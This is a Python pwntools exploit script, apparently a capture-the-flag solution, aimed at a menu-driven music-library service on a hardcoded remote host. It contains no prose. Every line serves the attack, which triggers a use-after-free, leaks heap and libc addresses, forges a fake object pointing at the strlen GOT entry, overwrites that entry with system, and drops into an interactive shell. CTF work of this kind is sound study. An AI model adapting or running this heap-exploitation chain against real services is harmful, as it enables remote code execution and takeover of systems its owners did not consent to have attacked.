#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

#host = "10.211.55.6"
#port = 8888
host = "52.79.83.139"
port = 31337


r = remote(host,port)

def register(ids,pw,name,types,profile=None):
    r.recvuntil(">")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(types))
    r.recvuntil(":")
    r.sendline(ids)
    r.recvuntil(":")
    r.sendline(pw)
    r.recvuntil(":")
    r.sendline(name)
    if types == 2 :
        r.recvuntil(":")
        r.sendline(profile)


def login(ids,pw):
    r.recvuntil(">")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(ids)
    r.recvuntil(":")
    r.sendline(pw)

def writemusic(name,lyc):
    r.recvuntil(">")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(name)
    r.recvuntil(":")
    r.sendline(lyc)

def delmusic(idx):
    r.recvuntil(">")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))

def createbox(name):
    r.recvuntil(">")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(name)

def delbox(idx):
    r.recvuntil(">")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))

def buymusic(idx):
    r.recvuntil(">")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

def putmusic(box,idx):
    r.recvuntil(">")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(box))
    r.recvuntil(">")
    r.sendline(str(idx))

def ret():
    r.recvuntil(">")
    r.sendline("5")

def ret9():
    r.recvuntil(">")
    r.sendline("9")

def delu(idx):
    r.recvuntil(">")
    r.sendline("8")
    r.recvuntil(":")
    r.sendline(str(idx))

def mov_box_box(src,dest,idxs,idxd):
    r.recvuntil(">")
    r.sendline("5")
    r.recvuntil(":")
    r.sendline(str(src))
    r.recvuntil(":")
    r.sendline(str(dest))
    r.recvuntil(":")
    r.sendline(str(idxs))
    r.recvuntil(":")
    r.sendline(str(idxd))

def editpro(data):
    r.recvuntil(">")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(data)

def showbox():
    r.recvuntil(">")
    r.sendline("6")

def editmusic(idx,lyc):
    r.recvuntil(">")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.sendline(lyc)

register("ddaa","nogg","phd",1)
register("orange","nogg","phd",2,"wtf")
login("orange","nogg")
writemusic("meh","qq")
ret()
login("ddaa","nogg")
createbox("meh")
buymusic(0)
putmusic(0,0)
ret9()
login("orange","nogg")
delmusic(0)
ret()
login("ddaa","nogg")
delu(0)
mov_box_box(0,0,0,0) #trigger uaf
reg = 0x607340
createbox(p64(reg))
showbox()
r.recvuntil("Lyrics : ")
heap = u64(r.recvuntil("-")[:-1].ljust(8,"\x00")) - 0x11f30
print hex(heap)
ret9()
login("orange","nogg")
writemusic("lays","nogg")
writemusic("laysnogg","nogg")
ret()
login("ddaa","nogg")
createbox("mehqq")
buymusic(0)
putmusic(2,0)
ret9()
login("orange","nogg")
delmusic(0)
ret()
login("ddaa","nogg")
delu(0)
fake_music = heap + 0x12340
mov_box_box(2,2,0,0)
createbox(p64(fake_music))
delbox(2)
orange = heap + 0x11eb0
ret9()
register("angelboy","xx","angel",2,"a"*0x20) 
login("angelboy","xx")
strlen_got = 0x605078
fake_music = p64(strlen_got)*2 + p64(0) + p64(orange)
editpro(fake_music)
ret()
login("ddaa","nogg")
r.recvuntil(">")
r.sendline("3")
r.recvuntil("1. ")

libc = u64(r.recvuntil("\n")[:-1].ljust(8,"\x00"))  - 0x8b720
print hex(libc)

r.recvuntil(":")
r.sendline("4")
ret9()
login("angelboy","xx")
system = libc + 0x45390
editmusic(1,p64(system)[:6])
r.recvuntil(">")
r.sendline("1")
r.recvuntil(":")
r.sendline("sh")
r.recvuntil(":")
r.sendline("sh")
r.interactive()
